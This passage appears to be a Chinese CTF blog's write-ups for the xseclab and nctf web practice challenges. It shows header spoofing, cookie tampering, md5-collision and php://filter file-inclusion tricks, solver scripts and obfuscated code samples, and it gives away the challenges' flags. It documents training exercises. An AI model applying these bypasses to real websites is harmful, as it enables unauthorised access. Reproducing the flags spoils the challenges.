lFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0=\"i = 0while True: try: password = base64.b64decode(password) i += 1 except: breakprint \"The Number of encryptions is:\",str(i)print password 第四题给出了md5加密的密文，直接扔到https://cmd5.org/解密得bighp 第五题网址：http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php 题目说只让外国人访问，用burp抓包看到头部看到Accept-Language: zh-CN,zh;q=0.9字段 尝试将zh-CN,zh;删除，得到key 第六题网址：http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php 只有HAHA浏览器才能访问页面，浏览器相关信息在User-Agent字段中体现，利用burp抓包在User-Agent字段添加HAHA即可得到key 第七题网址：http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php key在响应头部字段中 第八题网址：http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php 源代码显示访问http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php 明显有重定向 用burp抓包查看http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息 访问http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php key: ohHTTP302dd 第九题网址：http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php burp抓包将Cookie: Login=0修改成Cookie: Login=1 key is: yescookieedit7823789KJ 第十题网址：http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php 在控制台中修改input标签的max-length属性值，修改为1000，然后随便post四位数字以上即可 key is 768HKyu678567&amp;*&amp;K 第十一题网址：http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php 要求本地访问，用burp抓包添加X-Forwarded-For:127.0.0.1 这里服务器出问题了，直接给出了源代码和key is ^&amp;*(UIHKJjkadshf 第十二题网址：http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php 尝试了admin.php,login.php等都返回404，试着访问robots.txt，发现文件/9fb97531fe95594603aff7e794ab2f5f/ 访问，提示you find me,but I am not the login page. keep search. 尝试http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php 获得key is UIJ%%IOOqweqwsdf 脚本关第一题网址：http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php 重定向，burp抓包即可得key is : yougotit_script_now 第二题网址：http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php 要求我们2秒内计算出值，不然再刷新页面就换成别的算式 写个脚本计算即可 1234567891011121314151617import requestsimport rewhile True: url = \"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\" s = requests.Session() r = s.get(url) match = re.search(r'\\s(.*)=&lt;input',r.text) result = eval(match.group(1)) data = &#123; 'v':result, 'submit':'提交' &#125; r = s.post(url,data=data) if 'key' in r.text: print(r.text) break 第三题输入null即可 第四题源代码中发现js代码 123var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p&#125;('1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\\'\\':e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\\'\\'.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\\'\\\\\\\\w+\\'&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\\'\\\\\\\\b\\'+e(c)+\\'\\\\\\\\b\\',\\'g\\'),k[c]);1d p&#125;(\\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\\\\'\\\\\\':e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\\\\'\\\\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]||e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\'&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\'+e(c)+\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\',\\\\\\'g\\\\\\'),k[c]);S p&#125;(\\\\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\\\\\\\\'\\\\\\\\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]||e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\'&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\',\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\'),k[c]);A p&#125;(\\\\\\\\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]||c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'1 3=\"6\";1 4=\"7\";1 5=\"\";8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\\\\\\\\\',H,H,\\\\\\\\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\\\\\\\\'.K(\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\',X,X,\\\\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\\\\'.14(\\\\\\'|\\\\\\'),0,&#123;&#125;))\\',1t,1u,\\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\\'.1r(\\'|\\'),0,&#123;&#125;))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,&#123;&#125;);var d=eval(b);alert(\"key is first 14 chars\"+d); 直接扔到控制台执行后弹窗 截取key is first chars后的十四位就是key","categories":[{"name":"hacking-Web","slug":"hacking-Web","permalink":"https://Foxgrin.github.io/categories/hacking-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"nctf-Web","slug":"nctf-Web","date":"2018-08-12T02:48:00.000Z","updated":"2018-09-04T13:22:50.069Z","comments":true,"path":"/posts/7108/","link":"","permalink":"https://Foxgrin.github.io/posts/7108/","excerpt":"南京邮电大学ctf平台Web题解","text":"南京邮电大学ctf平台Web题解 签到题网址：http://chinalover.sinaapp.com/web1/ flag在源代码中 md5 collision网址：http://chinalover.sinaapp.com/web19/ 源码 123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; md5值碰撞，get参数a=240610708 即可 签到2网址：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php 提示我们输入口令zhimakaimen 但是源代码限制了输入文本的长度，在浏览器检查将长度修改即可输入完整口令 这题不是WEB网址：http://chinalover.sinaapp.com/web2/index.html 题目说不是web，看了源代码，抓了包，还真没找出什么，而且后缀名是html 下载下图片，用Notepad打开，发现最后藏了flag… 层层递进网址：http://chinalover.sinaapp.com/web3/ 用检查的network项发现有个404页面：http://chinalover.sinaapp.com/web3/404.html 进去发现源代码里给了提示 将jquery-后的字符一一拼凑就是flag，写个脚本快点 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; s = '''&lt;script src=\"./js/jquery-n.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-c.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#123;.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-h.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-a.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-l.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-4.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-g.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#125;.7.2.min.js\"&gt;&lt;/script&gt;'''&gt;&gt;&gt; match = re.findall(r'jquery-(.)\\.',s)&gt;&gt;&gt; match['n', 'c', 't', 'f', '&#123;', 't', 'h', 'i', 's', '_', 'i', 's', '_', 'a', '_', 'f', 'l', '4', 'g', '&#125;']&gt;&gt;&gt; flag = ''&gt;&gt;&gt; for i in match: flag = flag + i&gt;&gt;&gt; flag'nctf&#123;this_is_a_fl4g&#125;' AAencode网址：http://chinalover.sinaapp.com/web20/aaencode.txt 题目给出了提示js 的aaencode 用火狐浏览器打开时会出现乱码，首先按alt打开菜单，在查看的文字编码中选择unicode编码方式，就能得到这样的一串字符 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 经过查询这种编码方式解码后是一串js代码，并且可以不用解码直接丢入浏览器的控制台就可以执行，那么我们就直接丢入控制台执行 执行后提示变量ωﾟﾉ未被定义，我们定义变量ωﾟﾉ为空，然后再次输入代码 成功弹出flag 单身二十年网址：http://chinalover.sinaapp.com/web8/ 页面源代码看到链接 但是点击链接自动跳转到no_key_is_here_forever.php 说明有重定向，果断burp抓包 你从哪里来网址：http://chinalover.sinaapp.com/web22/ 貌似从谷歌页面访问该页面才能拿到flag 用burp抓包修改Referer字段值为https://www.google.com即可拿到flag php decode给出了源代码： 1234567891011121314&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI(\"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\"));?&gt; 一个加密的程序，直接执行就可以 结果 文件包含网址：http://4.chinalover.sinaapp.com/web7/index.php 看到file参数，很明显的文件包含，直接用php://filter协议读出index.php源代码 解密后 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 看到flag 单身一百年也没用网址：http://chinalover.sinaapp.com/web9/ 还是重定向，抓包 flag藏在响应头部 COOKIE网址：http://chinalover.sinaapp.com/web10/index.php 提示login first，burp抓包修改cookie中的login=1 拿到flag MYSQL网址：http://chinalover.sinaapp.com/web11/ 页面提示robots.txt 